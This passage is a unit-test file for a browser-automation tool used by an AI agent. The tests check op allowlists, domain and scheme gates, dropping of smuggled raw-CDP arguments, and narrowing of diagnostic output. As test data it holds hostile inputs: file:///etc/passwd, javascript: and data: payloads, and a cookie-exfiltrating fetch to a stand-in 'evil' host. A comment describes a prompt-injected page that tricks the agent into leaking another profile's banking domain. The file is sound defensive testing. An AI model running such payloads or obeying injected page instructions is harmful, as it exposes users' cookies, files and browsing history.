// Unit tests for the opencode browser-agent's TYPED tool logic
// (opencode/tools/browser_tool_impl.mjs). Pure — NO opencode, NO Brave, NO
// network: `fetchImpl` + `readToken` are injected. This is the authoritative
// coverage for the PR #180 RCE fix (the tool replaced the raw bash surface):
// op allowlist, FORCED tab (model cannot choose it), domain deny, request shape
// (token / Host / X-Session-Id / mapped op / forced tab), dry-run intercept, and
// the screenshot no-blob rule.
//
// Run: nix-shell -p nodejs --run "node --test scripts/browser-bridge/tests/browser_tool.test.mjs"
import test from "node:test";
import assert from "node:assert/strict";
import {
  OP_TO_SERVER, ALLOWED_OPS_DEFAULT, TEXT_MAX_BYTES_DEFAULT, NAV_ALLOWED_SCHEMES,
  BrowserToolRefusal, hostOf, navSchemeOf, hostDenied, allowedOpsFromEnv, forcedTab,
  buildRequest, summarizeResult, runBrowserOp,
} from "../opencode/tools/browser_tool_impl.mjs";

const TOK = "secret-token";
const TAB = "4242";

function baseEnv(extra = {}) {
  return { BROWSER_AGENT_TAB: TAB, BROWSER_BRIDGE_HOST: "127.0.0.1",
    BROWSER_BRIDGE_PORT: "8788", BROWSER_AGENT_SESSION_ID: "claude:sess", ...extra };
}

// A fetch stub that records the call and returns a canned 200 envelope.
function fetchStub(dataByOp = {}) {
  const calls = [];
  const impl = async (url, opts) => {
    const body = JSON.parse(opts.body);
    calls.push({ url, headers: opts.headers, method: opts.method, body });
    const data = dataByOp[body.op] ?? { url: "https://x.test", title: "X", text: "PAGE" };
    return { status: 200, async text() {
      return JSON.stringify({ ok: true, result: { id: "c", ok: true, data } });
    } };
  };
  impl.calls = calls;
  return impl;
}

const run = (args, env, fetchImpl, extra = {}) =>
  runBrowserOp(args, { env, fetchImpl, readToken: () => TOK, ...extra });

// --------------------------------------------------------------------------- //
// Pure helpers
// --------------------------------------------------------------------------- //
test("hostOf extracts a lowercased hostname; junk → ''", () => {
  assert.equal(hostOf("https://Sub.Example.COM/x?y"), "sub.example.com");
  assert.equal(hostOf("not a url"), "");
  assert.equal(hostOf(undefined), "");
});

test("hostDenied: deny match (incl. subdomain) wins; allowlist gates the rest", () => {
  assert.equal(hostDenied("evil.example.com", [], ["evil.example.com"]), true);
  assert.equal(hostDenied("sub.evil.example.com", [], ["evil.example.com"]), true);
  assert.equal(hostDenied("good.example.com", [], ["evil.example.com"]), false);
  // allowlist set: matching host allowed, non-matching denied.
  assert.equal(hostDenied("en.wikipedia.org", ["wikipedia.org"], []), false);
  assert.equal(hostDenied("other.com", ["wikipedia.org"], []), true);
  // no host (about:blank) is not gated here.
  assert.equal(hostDenied("", ["wikipedia.org"], []), false);
});

test("allowedOpsFromEnv defaults to the read/nav set; env override wins", () => {
  assert.deepEqual(allowedOpsFromEnv({}), [...ALLOWED_OPS_DEFAULT]);
  assert.deepEqual(allowedOpsFromEnv({ BROWSER_AGENT_ALLOWED_OPS: "text, html" }),
    ["text", "html"]);
});

test("forcedTab requires a numeric env tab; unset/invalid → disowned_tab refusal", () => {
  assert.equal(forcedTab({ BROWSER_AGENT_TAB: "7" }), 7);
  assert.throws(() => forcedTab({}), (e) =>
    e instanceof BrowserToolRefusal && /disowned_tab/.test(e.reason));
  assert.throws(() => forcedTab({ BROWSER_AGENT_TAB: "abc" }), /disowned_tab/);
});

// --------------------------------------------------------------------------- //
// buildRequest — the wire contract (token / Host / X-Session-Id / op map / tab)
// --------------------------------------------------------------------------- //
test("buildRequest: op allowlist rejects open/close/tabs/release", () => {
  for (const op of ["open", "close", "tabs", "release", "bogus", ""]) {
    assert.throws(() => buildRequest({ op }, baseEnv(), TOK),
      (e) => e instanceof BrowserToolRefusal && /op_not_allowed/.test(e.reason),
      `op ${op} must be refused`);
  }
});

test("buildRequest: forces the env tab + maps op names; headers carry the invariants", () => {
  const { url, headers, body } = buildRequest({ op: "html" }, baseEnv(), TOK);
  assert.equal(url, "http://127.0.0.1:8788/cmd");
  assert.equal(headers.Authorization, `Bearer ${TOK}`);
  assert.equal(headers.Host, "127.0.0.1");            // #168 loopback Host allowlist
  assert.equal(headers["X-Session-Id"], "claude:sess"); // routing-only
  assert.equal(body.op, "getHtml");                    // html → getHtml
  assert.equal(body.tab, 4242);                        // FORCED from env
});

test("buildRequest: the model CANNOT override the forced tab (no tab arg exists)", () => {
  // Even if a hostile arg tried to smuggle a tab/target, buildRequest ignores it.
  const { body } = buildRequest({ op: "text", tab: 999, target: "other" },
    baseEnv(), TOK);
  assert.equal(body.tab, 4242);
  assert.equal(body.target, undefined);
});

test("buildRequest: instance from env becomes the routing target", () => {
  const { body } = buildRequest({ op: "text" },
    baseEnv({ BROWSER_AGENT_INSTANCE: "work" }), TOK);
  assert.equal(body.target, "work");
});

test("buildRequest: text passes selector + maxBytes (default 32768)", () => {
  const a = buildRequest({ op: "text" }, baseEnv(), TOK).body;
  assert.equal(a.maxBytes, TEXT_MAX_BYTES_DEFAULT);
  const b = buildRequest({ op: "text", selector: "main", maxBytes: 10 }, baseEnv(), TOK).body;
  assert.equal(b.selector, "main");
  assert.equal(b.maxBytes, 10);
  assert.throws(() => buildRequest({ op: "text", maxBytes: -1 }, baseEnv(), TOK),
    /bad_maxBytes/);
});

test("buildRequest: nav enforces domain deny; missing url refused", () => {
  assert.throws(() => buildRequest({ op: "nav" }, baseEnv(), TOK), /nav_missing_url/);
  assert.throws(() => buildRequest({ op: "nav", url: "https://sub.evil.example.com/x" },
    baseEnv({ BROWSER_AGENT_DENY_DOMAINS: "evil.example.com" }), TOK),
    (e) => e instanceof BrowserToolRefusal && /domain_blocked/.test(e.reason));
  const ok = buildRequest({ op: "nav", url: "https://good.example.com" },
    baseEnv({ BROWSER_AGENT_DENY_DOMAINS: "evil.example.com" }), TOK).body;
  assert.equal(ok.url, "https://good.example.com");
});

test("buildRequest: nav respects an allowlist (non-allowed host refused)", () => {
  assert.throws(() => buildRequest({ op: "nav", url: "https://other.com" },
    baseEnv({ BROWSER_AGENT_ALLOW_DOMAINS: "wikipedia.org" }), TOK), /domain_blocked/);
  assert.ok(buildRequest({ op: "nav", url: "https://en.wikipedia.org/wiki/X" },
    baseEnv({ BROWSER_AGENT_ALLOW_DOMAINS: "wikipedia.org" }), TOK));
});

// --------------------------------------------------------------------------- //
// Fix #180-1 — a `nav` to any non-http(s) scheme is refused (allowlist bypass)
// --------------------------------------------------------------------------- //
test("navSchemeOf extracts a lowercased scheme; junk → ''", () => {
  assert.deepEqual(NAV_ALLOWED_SCHEMES, ["http:", "https:"]);
  assert.equal(navSchemeOf("HTTPS://Example.com/x"), "https:");
  assert.equal(navSchemeOf("file:///etc/passwd"), "file:");
  assert.equal(navSchemeOf("JavaScript:alert(1)"), "javascript:");
  assert.equal(navSchemeOf("example.com"), "");        // no scheme → unparseable
  assert.equal(navSchemeOf(undefined), "");
});

test("buildRequest: nav to a non-http(s) scheme is refused (bypasses domain confinement)", () => {
  for (const [url, scheme] of [
    ["file:///etc/passwd", "file:"],
    ["data:text/html,<script>alert(1)</script>", "data:"],
    ["about:blank", "about:"],
    ["javascript:alert(document.cookie)", "javascript:"],
    ["chrome://settings", "chrome:"],
    ["view-source:https://example.com", "view-source:"],
  ]) {
    assert.throws(
      // NB: even with a permissive allowlist these must be refused on scheme alone.
      () => buildRequest({ op: "nav", url },
        baseEnv({ BROWSER_AGENT_ALLOW_DOMAINS: "example.com" }), TOK),
      (e) => e instanceof BrowserToolRefusal &&
        e.reason === `nav_scheme_denied:${scheme}`,
      `nav to ${url} must be refused as nav_scheme_denied:${scheme}`);
  }
  // An unparseable / schemeless target is refused too (no confirmable scheme).
  assert.throws(() => buildRequest({ op: "nav", url: "not a url" }, baseEnv(), TOK),
    (e) => e instanceof BrowserToolRefusal && /nav_scheme_denied:<none>/.test(e.reason));
  // The scheme gate fires BEFORE host allow/deny — a denied http(s) host still
  // reports domain_blocked (scheme ok), a file: URL reports the scheme refusal.
  assert.throws(() => buildRequest({ op: "nav", url: "https://other.com" },
    baseEnv({ BROWSER_AGENT_ALLOW_DOMAINS: "wikipedia.org" }), TOK), /domain_blocked/);
});

test("runBrowserOp: a non-http(s) nav is refused before any fetch (live + dry-run)", async () => {
  const f = fetchStub();
  for (const url of ["file:///etc/passwd", "data:text/html,x", "about:blank",
                     "javascript:alert(1)"]) {
    await assert.rejects(() => run({ op: "nav", url }, baseEnv(), f),
      /nav_scheme_denied/, `${url} must be refused pre-bridge`);
  }
  assert.equal(f.calls.length, 0, "no scheme-denied nav may reach the bridge");
  // A normal https nav still passes the allowlist and DOES reach the bridge.
  const out = await run({ op: "nav", url: "https://en.wikipedia.org/wiki/X" },
    baseEnv({ BROWSER_AGENT_ALLOW_DOMAINS: "wikipedia.org" }),
    fetchStub({ nav: { url: "https://en.wikipedia.org/wiki/X", title: "X" } }));
  assert.match(out, /"ok":true/);
  // Dry-run nav also refuses a file: scheme (can't "preview" a scheme bypass).
  await assert.rejects(() => run({ op: "nav", url: "file:///etc/passwd" },
    baseEnv({ BROWSER_AGENT_DRY_RUN: "1" }), f), /nav_scheme_denied/);
});

test("buildRequest: eval requires js + best-effort refuses a denied-host reference", () => {
  assert.throws(() => buildRequest({ op: "eval" }, baseEnv(), TOK), /eval_missing_js/);
  assert.throws(() => buildRequest({ op: "eval",
    js: "location.href='https://evil.example.com'" },
    baseEnv({ BROWSER_AGENT_DENY_DOMAINS: "evil.example.com" }), TOK),
    /eval_references_blocked/);
  const ok = buildRequest({ op: "eval", js: "document.title" }, baseEnv(), TOK).body;
  assert.equal(ok.js, "document.title");
});

// --------------------------------------------------------------------------- //
// summarizeResult — never dumps a screenshot blob
// --------------------------------------------------------------------------- //
test("summarizeResult: text/html/eval return their payload; screenshot returns only a note", () => {
  assert.equal(summarizeResult("text", { data: { text: "hi" } }), "hi");
  assert.equal(summarizeResult("html", { data: { html: "<b>x</b>" } }), "<b>x</b>");
  assert.equal(summarizeResult("eval", { data: { value: "42" } }), "42");
  const big = "data:image/png;base64," + "A".repeat(50000);
  const s = summarizeResult("screenshot", { data: { dataUrl: big } });
  assert.ok(!s.includes("AAAA"), "screenshot base64 must NOT be dumped to the model");
  assert.match(s, /"screenshot":true/);
});

// --------------------------------------------------------------------------- //
// runBrowserOp — end-to-end with a mocked fetch
// --------------------------------------------------------------------------- //
test("runBrowserOp: happy text read POSTs the forced tab + returns the page text", async () => {
  const f = fetchStub();
  const out = await run({ op: "text" }, baseEnv(), f);
  assert.equal(out, "PAGE");
  assert.equal(f.calls.length, 1);
  const c = f.calls[0];
  assert.equal(c.method, "POST");
  assert.equal(c.body.tab, 4242);
  assert.equal(c.headers.Authorization, `Bearer ${TOK}`);
  assert.equal(c.headers["X-Session-Id"], "claude:sess");
});

test("runBrowserOp: a non-allowlisted op never reaches fetch", async () => {
  const f = fetchStub();
  await assert.rejects(() => run({ op: "close" }, baseEnv(), f), /op_not_allowed/);
  await assert.rejects(() => run({ op: "open" }, baseEnv(), f), /op_not_allowed/);
  assert.equal(f.calls.length, 0);
});

test("runBrowserOp: a disowned (unset) tab never reaches fetch", async () => {
  const f = fetchStub();
  await assert.rejects(() => run({ op: "text" }, { BROWSER_BRIDGE_PORT: "8788" }, f),
    /disowned_tab/);
  assert.equal(f.calls.length, 0);
});

test("runBrowserOp: nav to a denied domain is refused before any fetch", async () => {
  const f = fetchStub();
  await assert.rejects(
    () => run({ op: "nav", url: "https://evil.example.com" },
      baseEnv({ BROWSER_AGENT_DENY_DOMAINS: "evil.example.com" }), f),
    /domain_blocked/);
  assert.equal(f.calls.length, 0);
});

test("runBrowserOp: an op-level bridge failure surfaces as a refusal", async () => {
  const f = async () => ({ status: 200, async text() {
    return JSON.stringify({ ok: true, result: { ok: false, error: "owned_tab_gone" } });
  } });
  await assert.rejects(() => run({ op: "text" }, baseEnv(), f), /op_failed:owned_tab_gone/);
});

test("runBrowserOp: a non-200 bridge response is a hard error", async () => {
  const f = async () => ({ status: 503, async text() { return "no extension"; } });
  await assert.rejects(() => run({ op: "text" }, baseEnv(), f), /HTTP 503/);
});

test("runBrowserOp: dry-run intercepts nav/eval (no fetch) but still enforces deny", async () => {
  const f = fetchStub();
  const out = await run({ op: "nav", url: "https://good.example.com" },
    baseEnv({ BROWSER_AGENT_DRY_RUN: "1" }), f);
  assert.match(out, /"dryRun":true/);
  assert.equal(f.calls.length, 0, "dry-run must not touch the bridge");
  // dry-run still refuses a denied domain (can't preview a blocked host).
  await assert.rejects(() => run({ op: "nav", url: "https://evil.example.com" },
    baseEnv({ BROWSER_AGENT_DRY_RUN: "1", BROWSER_AGENT_DENY_DOMAINS: "evil.example.com" }), f),
    /domain_blocked/);
});

test("OP_TO_SERVER maps only the bounded ops (no lifecycle ops, no raw CDP)", () => {
  // `whoami` is a read-only GLOBAL diagnostic (GET /whoami) — bounded + typed
  // like the rest; still NO lifecycle ops and NO raw-CDP escape.
  assert.deepEqual(Object.keys(OP_TO_SERVER).sort(),
    ["click", "eval", "frames", "html", "key", "nav", "screenshot",
     "text", "type", "upload", "wake", "whoami"]);
  // Lifecycle ops (wrapper owns the tab) AND any raw-CDP escape must be unmappable.
  for (const forbidden of ["open", "close", "tabs", "release",
                           "cdp", "command", "attach", "detach", "sendCommand"]) {
    assert.ok(!(forbidden in OP_TO_SERVER), `${forbidden} must not be mappable`);
  }
  // The AUTONOMOUS agent's DEFAULT op set is a strict subset: `upload` is mappable
  // (so an explicit BROWSER_AGENT_ALLOWED_OPS opt-in can reach it) but is NOT
  // enabled by default — it takes a caller-chosen absolute path with no allowlist,
  // and the model is pointed at untrusted, prompt-injecting pages.
  assert.deepEqual([...ALLOWED_OPS_DEFAULT].sort(),
    ["click", "eval", "frames", "html", "key", "nav", "screenshot",
     "text", "type", "wake", "whoami"]);
  assert.ok(!ALLOWED_OPS_DEFAULT.includes("upload"),
    "upload must NOT be in the autonomous agent's default op set");
  assert.ok("upload" in OP_TO_SERVER,
    "upload stays mappable so an explicit BROWSER_AGENT_ALLOWED_OPS opt-in still works");
});

test("SECURITY: `activate` is UNREACHABLE for the autonomous agent — not even opt-in", async () => {
  // `activate` foregrounds the tab and (server-side) raises the Brave window via
  // i3-msg: it TAKES THE OPERATOR'S SCREEN. Telemetry caught a driving session
  // calling it 1-5x/MINUTE. Unlike `upload` (operator-opt-in-able), the model can
  // never reach it — it is absent from OP_TO_SERVER, so the allowlist gate refuses
  // it even when BROWSER_AGENT_ALLOWED_OPS explicitly names it.
  assert.ok(!("activate" in OP_TO_SERVER), "activate must NOT be mappable at all");
  assert.ok(!ALLOWED_OPS_DEFAULT.includes("activate"));
  assert.throws(() => buildRequest({ op: "activate" }, baseEnv(), TOK),
    /op_not_allowed:activate/);
  assert.throws(
    () => buildRequest({ op: "activate" },
      baseEnv({ BROWSER_AGENT_ALLOWED_OPS: "text,activate" }), TOK),
    /op_not_allowed:activate/,
    "an explicit opt-in must NOT resurrect focus theft for the model");
  const fx = fetchStub({});
  await assert.rejects(
    () => run({ op: "activate" },
      baseEnv({ BROWSER_AGENT_ALLOWED_OPS: "text,activate" }), fx),
    /op_not_allowed:activate/);
  assert.equal(fx.calls.length, 0, "nothing ever reached the bridge");
});

test("buildRequest: wake forces the env tab; bounded waitMs only; NO raw passthrough", () => {
  // Bare wake → only op + the forced tab (own-tab-scoped; model can't name a tab).
  const bare = buildRequest({ op: "wake" }, baseEnv(), TOK).body;
  assert.equal(bare.op, "wake");
  assert.equal(bare.tab, 4242, "wake is forced to the env tab");
  assert.deepEqual(Object.keys(bare).sort(), ["op", "tab"]);
  // A valid waitMs (the un-throttle settle) passes through as a typed int.
  const w = buildRequest({ op: "wake", waitMs: 1500 }, baseEnv(), TOK).body;
  assert.equal(w.waitMs, 1500);
  assert.deepEqual(Object.keys(w).sort(), ["op", "tab", "waitMs"]);
  assert.equal(buildRequest({ op: "wake", waitMs: 0 }, baseEnv(), TOK).body.waitMs, 0);
  // A bad waitMs is refused (never forwarded raw); a smuggled extra arg is dropped.
  assert.throws(() => buildRequest({ op: "wake", waitMs: -5 }, baseEnv(), TOK), /bad_waitMs/);
  assert.throws(() => buildRequest({ op: "wake", waitMs: 1.5 }, baseEnv(), TOK), /bad_waitMs/);
  const smuggled = buildRequest(
    { op: "wake", tab: 1, cdp: "x", method: "Page.navigate", waitMs: 100 },
    baseEnv(), TOK).body;
  assert.deepEqual(Object.keys(smuggled).sort(), ["op", "tab", "waitMs"],
    "wake never forwards a smuggled tab/cdp/method");
  assert.equal(smuggled.tab, 4242, "the forced env tab wins over a model-supplied tab");
});

test("summarizeResult: wake returns compact metadata-only confirmation", () => {
  const s = JSON.parse(summarizeResult("wake", { data: {
    tabId: 9, url: "https://x.test/", title: "X", woke: true,
    visibilityState: "visible", readyState: "complete", settleMs: 1500,
    applied: ["Page.setWebLifecycleState", "Emulation.setFocusEmulationEnabled"] } }));
  assert.deepEqual(s, { ok: true, tabId: 9, woke: true, visibilityState: "visible",
    readyState: "complete", settleMs: 1500, url: "https://x.test/", title: "X" });
});

test("summarizeResult: wake reports woke:false honestly when the tab stayed hidden", () => {
  const s = JSON.parse(summarizeResult("wake", { data: {
    tabId: 9, url: "https://x.test/", title: "X", woke: false,
    visibilityState: "hidden" } }));
  assert.equal(s.woke, false);
  assert.equal(s.visibilityState, "hidden");
  assert.equal(s.settleMs, null, "an omitted field summarizes as null, never throws");
});

test("runBrowserOp: wake reaches the bridge with the forced tab", async () => {
  const fx = fetchStub({ wake: { tabId: 4242, url: "https://x.test/", title: "X",
    woke: true, visibilityState: "visible", readyState: "complete", settleMs: 200 } });
  const out = JSON.parse(await run({ op: "wake", waitMs: 200 }, baseEnv(), fx));
  assert.equal(fx.calls.length, 1);
  assert.equal(fx.calls[0].body.op, "wake");
  assert.equal(fx.calls[0].body.tab, 4242, "forced env tab");
  assert.equal(fx.calls[0].body.waitMs, 200);
  assert.equal(out.ok, true);
  assert.equal(out.woke, true);
});

// --------------------------------------------------------------------------- //
// CDP ops via the TYPED tool: bounded ops, forced own-tab, NO raw-CDP passthrough.
// --------------------------------------------------------------------------- //
test("buildRequest: the CDP ops (frames/click/type/key) force the env tab", () => {
  for (const [op, args] of [["frames", {}], ["click", { selector: "#go" }],
                            ["type", { text: "hi" }], ["key", { key: "Enter" }]]) {
    const { body } = buildRequest({ op, ...args }, baseEnv(), TOK);
    assert.equal(body.op, op);
    assert.equal(body.tab, 4242, `${op} must be forced to the env tab`);
  }
});

test("buildRequest: click/type/key enforce their required typed fields", () => {
  assert.throws(() => buildRequest({ op: "click" }, baseEnv(), TOK), /click_missing_selector/);
  assert.throws(() => buildRequest({ op: "type" }, baseEnv(), TOK), /type_missing_text/);
  assert.throws(() => buildRequest({ op: "type", text: "" }, baseEnv(), TOK), /type_missing_text/);
  assert.throws(() => buildRequest({ op: "key" }, baseEnv(), TOK), /key_missing_key/);
  // The happy shapes forward exactly the typed scalar(s).
  assert.equal(buildRequest({ op: "click", selector: "#go" }, baseEnv(), TOK).body.selector, "#go");
  const t = buildRequest({ op: "type", text: "hello", selector: "#in" }, baseEnv(), TOK).body;
  assert.equal(t.text, "hello");
  assert.equal(t.selector, "#in");
  assert.equal(buildRequest({ op: "key", key: "Enter" }, baseEnv(), TOK).body.key, "Enter");
});

test("buildRequest: --frame is forwarded (typed scalar) on read/click ops", () => {
  for (const [op, args] of [["text", {}], ["html", {}], ["eval", { js: "1" }],
                            ["click", { selector: "#x" }], ["type", { text: "y" }],
                            ["key", { key: "Tab" }]]) {
    const { body } = buildRequest({ op, frame: "model-benchmarking", ...args },
      baseEnv(), TOK);
    assert.equal(body.frame, "model-benchmarking", `${op} must forward --frame`);
  }
  // A pathological frame value is length-bounded (can't bloat the body).
  const big = buildRequest({ op: "text", frame: "x".repeat(5000) }, baseEnv(), TOK).body;
  assert.equal(big.frame.length, 512);
});

test("NO raw-CDP passthrough: an arbitrary cdp/method/params arg is DROPPED, never forwarded", () => {
  // The RCE-class regression guard. Even if the model smuggles a raw CDP command,
  // buildRequest builds the wire body from a WHITELIST, so none of it reaches the
  // bridge. There is no op that carries a CDP method at all.
  const hostile = {
    op: "frames",
    cdp: "Page.navigate", method: "Runtime.evaluate",
    params: { url: "file:///etc/passwd", expression: "fetch('http://evil/'+document.cookie)" },
    command: "Browser.close", tab: 999, tabId: 999, target: "other-profile",
  };
  const { body } = buildRequest(hostile, baseEnv(), TOK);
  assert.deepEqual(Object.keys(body).sort(), ["op", "tab"],
    "ONLY op + the forced tab may reach the wire for a CDP op with no typed fields");
  assert.equal(body.tab, 4242, "the forced own-tab wins over any smuggled tab");
  for (const leak of ["cdp", "method", "params", "command", "target", "tabId"]) {
    assert.ok(!(leak in body), `${leak} must never be forwarded`);
  }
});

test("NO raw-CDP passthrough: even click/type carry only their typed fields", () => {
  const c = buildRequest({ op: "click", selector: "#go", method: "Input.dispatchMouseEvent",
    params: { x: 0, y: 0 }, cdp: "x" }, baseEnv(), TOK).body;
  assert.deepEqual(Object.keys(c).sort(), ["op", "selector", "tab"]);
  const t = buildRequest({ op: "type", text: "hi", cdp: "evil", extra: 1 }, baseEnv(), TOK).body;
  assert.deepEqual(Object.keys(t).sort(), ["op", "tab", "text"]);
});

test("summarizeResult: CDP ops summarize compactly; type NEVER echoes the text", () => {
  assert.deepEqual(JSON.parse(summarizeResult("frames",
    { data: { frames: [{ frameId: "F1", url: "https://a/", name: "" }] } })),
    [{ frameId: "F1", url: "https://a/", name: "" }]);
  assert.deepEqual(JSON.parse(summarizeResult("click",
    { data: { clicked: "#go", x: 12, y: 34 } })),
    { ok: true, clicked: "#go", x: 12, y: 34 });
  const typed = JSON.parse(summarizeResult("type", { data: { typed: 5 } }));
  assert.deepEqual(typed, { ok: true, typed: 5 });
  assert.ok(!("text" in typed), "the typed text must never be echoed back to the model");
  assert.deepEqual(JSON.parse(summarizeResult("key", { data: { key: "Enter" } })),
    { ok: true, key: "Enter" });
});

test("runBrowserOp: a CDP op (frames) reaches the bridge with the forced tab", async () => {
  const fx = fetchStub({ frames: { url: "https://civitai.com", frames: [
    { frameId: "F1", url: "https://model-benchmarking.civit.ai/app", name: "bench" }] } });
  const out = await run({ op: "frames" }, baseEnv(), fx);
  assert.equal(fx.calls.length, 1);
  assert.equal(fx.calls[0].body.op, "frames");
  assert.equal(fx.calls[0].body.tab, 4242);
  assert.match(out, /model-benchmarking/);
});

test("runBrowserOp: dry-run intercepts the trusted-input ops (no fetch)", async () => {
  const fx = fetchStub();
  for (const args of [{ op: "click", selector: "#go" }, { op: "type", text: "hi" },
                      { op: "key", key: "Enter" }]) {
    const out = await run(args, baseEnv({ BROWSER_AGENT_DRY_RUN: "1" }), fx);
    assert.match(out, /"dryRun":true/);
  }
  assert.equal(fx.calls.length, 0, "a dry-run must never drive the browser");
});

test("runBrowserOp: a CDP op is refused when NOT in the op allowlist", async () => {
  const fx = fetchStub();
  await assert.rejects(
    run({ op: "click", selector: "#x" },
      baseEnv({ BROWSER_AGENT_ALLOWED_OPS: "text,html" }), fx),
    /op_not_allowed:click/);
  assert.equal(fx.calls.length, 0);
});

// --------------------------------------------------------------------------- //
// whoami — read-only GLOBAL identity/diagnostics op (GET /whoami, no tab, no body)
// --------------------------------------------------------------------------- //
// A GET stub for /whoami: records the call + returns a canned identity object
// DIRECTLY (no {result:<envelope>} wrapper — whoami is not a /cmd op).
function whoamiFetchStub(obj) {
  const calls = [];
  const body = obj ?? {
    ok: true,
    host: { label: "workbench", source: "ip", ips: ["192.168.50.250"] },
    bridge: {
      endpoint: "http://127.0.0.1:8788", port: 8788,
      server_version: { version: "whoami-1", git: "abc1234" },
      connected: 1,
      rate_limit: { per_sec: 5, burst: 20, max_queue: 32 },
      extension_version_current: "0.1.0",
    },
    instances: [{ key: "work", label: "work", instanceId: "uuid-a",
                  activeTabDomain: "example.com", extension_version: "0.1.0" }],
  };
  const impl = async (url, opts) => {
    calls.push({ url, headers: opts.headers, method: opts.method, body: opts.body });
    return { status: 200, async text() { return JSON.stringify(body); } };
  };
  impl.calls = calls;
  return impl;
}

test("buildRequest: whoami is a GLOBAL GET /whoami — no tab, no body, Host pinned", () => {
  // whoami does NOT require BROWSER_AGENT_TAB (it is not tab-scoped): even with
  // NO tab in env it builds cleanly, unlike every /cmd op.
  const req = buildRequest({ op: "whoami" },
    { BROWSER_BRIDGE_HOST: "127.0.0.1", BROWSER_BRIDGE_PORT: "8788" }, TOK);
  assert.equal(req.method, "GET");
  assert.equal(req.url, "http://127.0.0.1:8788/whoami");
  assert.equal(req.headers.Authorization, `Bearer ${TOK}`);
  assert.equal(req.headers.Host, "127.0.0.1");   // #168 loopback Host allowlist
  assert.equal(req.body, null);
  // No /cmd fields leak in (no op/tab/target smuggling — nothing is forwarded).
  assert.equal(req.headers["Content-Type"], undefined);
});

test("buildRequest: whoami is refused when NOT in the op allowlist (gate holds)", () => {
  assert.throws(() => buildRequest({ op: "whoami" },
    baseEnv({ BROWSER_AGENT_ALLOWED_OPS: "text,html" }), TOK),
    (e) => e instanceof BrowserToolRefusal && /op_not_allowed:whoami/.test(e.reason));
});

test("summarizeResult: whoami returns metadata-only identity (no page content)", () => {
  const s = JSON.parse(summarizeResult("whoami", {
    ok: true,
    host: { label: "laptop", source: "activity_host_env", ips: ["192.168.50.155"] },
    bridge: { endpoint: "http://127.0.0.1:8788", connected: 2,
      server_version: { version: "whoami-1", git: null },
      extension_version_current: "0.1.0" },
    instances: [{ key: "work", label: "work", instanceId: "uuid-a",
                  activeTabDomain: "civitai.com", extension_version: "0.1.0" }],
  }));
  assert.equal(s.host.label, "laptop");
  assert.equal(s.host.source, "activity_host_env");
  assert.equal(s.bridge.connected, 2);
  assert.equal(s.bridge.extension_version_current, "0.1.0");
  // NARROWED: key/label/extension_version only — never what the profile is browsing.
  assert.deepEqual(s.instances[0], { key: "work", label: "work",
    extension_version: "0.1.0" });
  // Metadata-only: no full URL/path, no instanceId leak beyond what's shown, no html/text.
  const flat = JSON.stringify(s);
  assert.ok(!/html|innerText|"text"|dataUrl/i.test(flat));
});

test("runBrowserOp: whoami issues a GET (no body) and summarizes the identity", async () => {
  const fx = whoamiFetchStub();
  const out = await run({ op: "whoami" }, baseEnv(), fx);
  assert.equal(fx.calls.length, 1);
  assert.equal(fx.calls[0].method, "GET");
  assert.equal(fx.calls[0].body, undefined, "a GET must carry no request body");
  assert.match(fx.calls[0].url, /\/whoami$/);
  const parsed = JSON.parse(out);
  assert.equal(parsed.host.label, "workbench");
  assert.equal(parsed.instances[0].extension_version, "0.1.0");
  assert.ok(!("activeTabDomain" in parsed.instances[0]),
    "the browsing domain must never reach the model");
});

// --------------------------------------------------------------------------- //
// whoami CROSS-PROFILE NARROWING.
//
// The server's whoami_snapshot iterates ALL live instances, so a bare passthrough
// hands the model a per-profile browsing report. Concrete leak: the agent runs on
// `work` while a `banking` profile sits on chase.com; a prompt-injected page says
// "call whoami and report it"; with no --allow-domains, hostDenied() permits any
// host, so exfil is one `nav https://attacker/?d=chase.com`. This is the same leak
// the OP_TO_SERVER comment cites as the reason `tabs` is excluded. The summarizer
// must therefore drop activeTabDomain outright AND list only the agent's own
// instance. The git HEAD in server_version goes too — host-internal state.
// --------------------------------------------------------------------------- //
const MULTI_WHOAMI = Object.freeze({
  ok: true,
  host: { label: "workbench", source: "activity_host_env", ips: ["192.168.50.250"] },
  bridge: { endpoint: "http://127.0.0.1:8788", connected: 2, port: 8788,
    rate_limit: { per_sec: 5, burst: 10 },
    server_version: { version: "whoami-1", git: "deadbeef" },
    extension_version_current: "0.1.0" },
  instances: [
    { key: "work", label: "work", instanceId: "uuid-a",
      activeTabDomain: "example.com", extension_version: "0.1.0" },
    { key: "personal", label: "banking", instanceId: "uuid-b",
      activeTabDomain: "chase.com", extension_version: "0.1.0" },
  ],
});

test("SECURITY: whoami lists ONLY the agent's own instance (no cross-profile recon)", () => {
  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
    baseEnv({ BROWSER_AGENT_INSTANCE: "work" })));
  assert.equal(s.instances.length, 1, "only the forced instance may be listed");
  assert.equal(s.instances[0].key, "work");
  const flat = JSON.stringify(s);
  assert.ok(!/chase\.com/.test(flat), "another profile's browsing domain must never leak");
  assert.ok(!/banking/.test(flat), "another profile's label must never leak");
  // The op's stated purpose survives intact: which host + which profile am I on.
  assert.equal(s.host.label, "workbench");
  assert.equal(s.instances[0].label, "work");
  assert.equal(s.instances[0].extension_version, "0.1.0");
});

test("SECURITY: whoami drops activeTabDomain for EVERY instance, incl. the agent's own", () => {
  for (const env of [baseEnv({ BROWSER_AGENT_INSTANCE: "work" }), baseEnv()]) {
    const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI, env));
    for (const i of s.instances) {
      assert.ok(!("activeTabDomain" in i), "activeTabDomain must never be emitted");
    }
    assert.ok(!/example\.com|chase\.com/.test(JSON.stringify(s)),
      "no browsing domain may reach the model");
  }
});

test("SECURITY: whoami matches the forced instance by LABEL too (wrapper accepts either)", () => {
  // `--instance` may name an auto key or a human label; both must resolve.
  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
    baseEnv({ BROWSER_AGENT_INSTANCE: "banking" })));
  assert.equal(s.instances.length, 1);
  assert.equal(s.instances[0].key, "personal");
});

test("SECURITY: whoami fails CLOSED when the forced instance matches nothing", () => {
  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
    baseEnv({ BROWSER_AGENT_INSTANCE: "nonexistent" })));
  assert.deepEqual(s.instances, [],
    "an unmatched forced instance must not fall back to listing them all");
});

test("SECURITY: whoami drops the git HEAD but keeps the version string", () => {
  const s = JSON.parse(summarizeResult("whoami", MULTI_WHOAMI,
    baseEnv({ BROWSER_AGENT_INSTANCE: "work" })));
  assert.equal(s.bridge.server_version, "whoami-1", "the human-facing version survives");
